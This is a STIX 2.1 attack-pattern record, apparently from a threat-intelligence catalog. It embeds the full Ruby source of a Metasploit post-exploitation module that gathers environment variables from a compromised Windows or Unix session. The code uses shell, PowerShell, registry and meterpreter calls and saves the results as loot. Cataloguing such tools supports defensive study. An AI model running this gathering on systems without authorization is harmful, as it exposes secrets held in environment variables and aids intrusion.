{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bc54c5db-d47d-4be9-9da4-6934773fec4c",
    "created": "2024-08-14T16:33:19.173546Z",
    "modified": "2024-08-14T16:33:19.17355Z",
    "name": "Multi Gather Generic Operating System Environment Settings",
    "description": "This module prints out the operating system environment variables. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/env.rb",
            "external_id": "env.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Generic Operating System Environment Settings',\n        'Description' => %q{ This module prints out the operating system environment variables. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>', 'egypt' ],\n        'Platform' => %w[linux win unix],\n        'SessionTypes' => %w[powershell shell meterpreter],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    output = case session.type\n             when 'shell'\n               get_env_shell\n             when 'powershell'\n               get_env_powershell\n             when 'meterpreter'\n               get_env_meterpreter\n             end\n\n    fail_with(Failure::Unknown, 'Could not retrieve environment variables') if output.blank?\n\n    if session.platform == 'windows'\n      ltype = 'windows.environment'\n    else\n      ltype = 'unix.environment'\n    end\n\n    print_line(output)\n    path = store_loot(ltype, 'text/plain', session, output)\n    print_good(\"Results saved to #{path}\")\n  end\n\n  def get_env_shell\n    cmd = session.platform == 'windows' ? 'set' : 'env'\n    cmd_exec(cmd)\n  end\n\n  def get_env_powershell\n    res = cmd_exec('Get-ChildItem Env: | ConvertTo-Csv')\n\n    output = []\n    csv = CSV.parse(res, skip_lines: /^#/, headers: true)\n    csv.each do |row|\n      output << \"#{row['Key']}=#{row['Value']}\"\n    end\n\n    return output.join(\"\\n\")\n  end\n\n  def get_env_meterpreter\n    case session.platform\n    when 'windows'\n      var_names = []\n      var_names << registry_enumvals('HKEY_CURRENT_USER\\\\Volatile Environment')\n      var_names << registry_enumvals('HKEY_CURRENT_USER\\\\Environment')\n      var_names << registry_enumvals('HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment')\n      var_names.delete(nil)\n\n      output = []\n      session.sys.config.getenvs(*var_names.flatten.uniq.sort).each do |k, v|\n        output << \"#{k}=#{v}\"\n      end\n      return output.join(\"\\n\")\n    else\n      # Don't know what it is, hope it's unix\n      print_status(\"Executing 'env' on #{sysinfo['OS']}\")\n      chan = session.sys.process.execute('/bin/sh', '-c env', { 'Channelized' => true })\n      return chan.read\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux win unix]"
    ]
}